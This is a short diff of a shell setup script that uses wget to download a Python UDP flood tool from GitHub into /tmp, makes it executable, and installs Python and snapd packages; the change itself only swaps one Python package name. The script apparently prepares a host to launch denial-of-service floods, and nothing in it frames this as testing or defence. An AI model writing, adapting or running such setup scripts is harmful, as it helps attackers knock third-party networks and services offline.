@@ -3,7 +3,7 @@ clear
 wget -O /tmp/uwu.py 'https://raw.githubusercontent.com/XaviFortes/Python-UDP-Flood/master/udpflood.py'
 chmod +x /tmp/uwu.py
 sudo yum -y install epel-release
-sudo yum -y install snapd python3 python
+sudo yum -y install snapd python38 python
 sudo apt-get -y install python38
 sudo systemctl enable --now snapd.socket
 sudo ln -s /var/lib/snapd/snap /snap
